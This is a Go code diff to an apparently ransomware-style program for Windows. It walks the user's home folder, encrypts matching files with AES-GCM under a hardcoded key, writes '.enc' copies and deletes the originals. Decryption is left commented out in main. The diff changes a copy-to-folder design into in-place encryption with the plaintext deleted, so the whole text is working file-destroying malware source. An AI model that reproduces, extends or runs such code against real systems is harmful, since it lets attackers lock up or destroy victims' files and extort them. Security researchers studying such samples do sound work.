@@ -16,15 +16,6 @@ import (
 )
 
 func encrypt(key []byte, fileNames []string) {
-	cwd, _ := os.Getwd()
-	encryptedDir := cwd + "\\encrypted\\"
-
-	if _, err := os.Stat(encryptedDir); os.IsNotExist(err) {
-		err = os.Mkdir(encryptedDir, 0700)
-		if err != nil {
-			log.Panic(err)
-		}
-	}
 
 	for _, f := range fileNames {
 		plaintext, err := ioutil.ReadFile(f)
@@ -49,35 +40,24 @@ func encrypt(key []byte, fileNames []string) {
 
 		ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 
-		fname := filepath.Base(f)
-		err = ioutil.WriteFile(encryptedDir+fname, ciphertext, 0777)
+		err = ioutil.WriteFile(f+".enc", ciphertext, 0777)
 		if err != nil {
 			log.Panic(err)
 		}
 		writeLog("Encrypted: " + f)
-	}
-	writeLog("Encryption routine complete!")
-}
 
-func decrypt(key []byte) {
-	cwd, _ := os.Getwd()
-	encryptedDir := cwd + "\\encrypted\\"
-	decryptedDir := cwd + "\\decrypted\\"
-
-	if _, err := os.Stat(decryptedDir); os.IsNotExist(err) {
-		err = os.Mkdir(decryptedDir, 0700)
+		err = os.Remove(f)
 		if err != nil {
 			log.Panic(err)
 		}
 	}
+	writeLog("Encryption routine complete!")
+}
 
-	fileNames, err := ioutil.ReadDir(encryptedDir)
-	if err != nil {
-		log.Panic(err)
-	}
+func decrypt(key []byte, fileNames []string) {
 
 	for _, f := range fileNames {
-		ciphertext, err := ioutil.ReadFile(encryptedDir + f.Name())
+		ciphertext, err := ioutil.ReadFile(f)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -99,17 +79,22 @@ func decrypt(key []byte) {
 			log.Panic(err)
 		}
 
-		fname := filepath.Base(f.Name())
-		err = ioutil.WriteFile(decryptedDir+fname, plaintext, 0777)
+		fname := strings.Replace(f, ".enc", "", -1)
+		err = ioutil.WriteFile(fname, plaintext, 0777)
 		if err != nil {
 			log.Panic(err)
 		}
 		writeLog("Decrypted: " + fname)
+		err = os.Remove(f)
+		if err != nil {
+			log.Panic(err)
+		}
 	}
 	writeLog("Decryption routine complete!")
+
 }
 
-func getFilenamesToEncrypt(userHome string, ignoreDirectory []string, targetExt []string) []string {
+func getFilenames(userHome string, ignoreDirectory []string, targetExt []string) []string {
 	var fileList = []string{}
 
 	filepath.Walk(userHome, func(path string, f os.FileInfo, err error) error {
@@ -198,9 +183,11 @@ func main() {
 
 	targetExt := []string{
 		".txt",
-		".bmp",
-		".jpg",
 	}
+
+	//encExt := []string{
+	//	".enc",
+	//}
 
 	if runtime.GOOS != "windows" {
 		fmt.Println("[-] Unsupported OS")
@@ -209,8 +196,10 @@ func main() {
 		key := []byte("password12345678")
 		userHome := os.Getenv("USERPROFILE")
 
-		fnames := getFilenamesToEncrypt(userHome, ignoreDirectory, targetExt)
+		fnames := getFilenames(userHome, ignoreDirectory, targetExt)
 		encrypt(key, fnames)
-		//decrypt(key)
+
+		//fnames := getFilenames(userHome, ignoreDirectory, encExt)
+		//decrypt(key, fnames)
 	}
 }
